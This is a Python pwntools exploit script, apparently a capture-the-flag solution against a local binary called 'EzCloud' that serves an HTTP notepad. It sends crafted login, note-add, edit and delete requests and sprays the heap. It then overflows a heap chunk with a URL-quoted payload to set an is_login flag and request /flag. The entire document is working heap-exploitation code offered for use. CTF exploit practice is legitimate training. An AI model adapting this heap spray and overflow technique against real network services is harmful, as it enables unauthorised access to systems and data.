#!/usr/bin/env python3
from pwn import *
from urllib.parse import quote

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./EzCloud')
    elf = ELF('./EzCloud')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def add_in_post(tp, idx, _id, size, py):
    if tp == 1:
        content_tp = 'multipart/form-data'
    elif tp == 2:
        content_tp = 'application/x-www-form-urlencoded'
    payload = (
        'POST /notepad HTTP/1.1\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: {}\r\n' + 
        'Login-ID: {}\r\n' + 
        'Note-Operation: {}\r\n' + 
        'Note-ID: {}\r\n\r\n{}'
    ).format(size, content_tp, _id, quote('new note'), idx, py).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def heap_spray(idx):
    payload = (
        'GET /notepad HTTP/1.1\r\n' + 
        'Login-ID: {}\r\n' + 
        'bbbbbbbbbbbbbbbbbbb: sssssssssssssssssssssss\r\n' + 
        '12345678901234567890123: zzzzzzzzzzzzzzzzzzzzzzz\r\n\r\n'
    ).format(idx).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def login(_id, size, py):
    payload = (
        'POST /login HTTP/1.1\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: multipart/form-data\r\n' + 
        'Login-ID: {}\r\n\r\n{}'
    ).format(size, _id, py).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def edit(idx, _id, size, py):
    payload = (
        'POST /notepad HTTP/1.1\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: application/x-www-form-urlencoded\r\n' + 
        'Login-ID: {}\r\n' + 
        'Note-Operation: {}\r\n' + 
        'Note-ID: {}\r\n\r\n{}'
    ).format(size, _id, quote('edit note'), idx, py).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def delete(idx, _id, size):
    payload = (
        'POST /notepad HTTP/1.1\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: application/x-www-form-urlencoded\r\n' + 
        'Login-ID: {}\r\n' + 
        'Note-Operation: {}\r\n' + 
        'Note-ID: {}\r\n\r\n'
    ).format(size, _id, quote('delete note'), idx).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def logout(_id, size, py):
    payload = (
        'POST /logout HTTP/1.1\r\n' + 
        'Login-ID: {}\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: multipart/form-data\r\n\r\n{}'
    ).format(_id, size, py).encode()
    p.sendline(payload)
    p.recvuntil(b'</html>')

def get_flag(_id, size, py):
    payload = (
        'GET /flag HTTP/1.1\r\n' + 
        'Login-ID: {}\r\n' + 
        'Content-Length: {}\r\n' + 
        'Content-Type: multipart/form-data\r\n\r\n{}'
    ).format(_id, size, py).encode()
    p.sendline(payload)
    print(p.recvuntil(b'</html>'))

# set environment & cleanup fastbins
login('0', 0xf85, 0xf85 * 'A') # 0
#gdb.attach(p, 'b *$rebase(0x0000000000008058)\nc')
add_in_post(2, '0', '0', 0x17, 0x17 * 'A')
#gdb.attach(p, 'b *$rebase(0x00000000000098CD)\nb *$rebase(0x0000000000009976)\nc')
for i in range(40):
    heap_spray('0')
for i in range(2):
    add_in_post(1, str(i), '0', 0x17, 0x17 * 'A')
login('1', 0xf85, 0xf85 * 'A')
login('2', 0xf85, 0xf85 * 'A')
login('0', 0xf85, 0xf85 * 'A')

# chunk overflow -> set is_login=1
#gdb.attach(p, 'b *$rebase(0x00000000000081AF)\nc')
py = quote(0x18 * b'A' + p64(0xd1) + p64(1))
edit('2', '0', len(py), py)
get_flag('1', len(py), py)

#gdb.attach(p)

#p.interactive()
p.close()

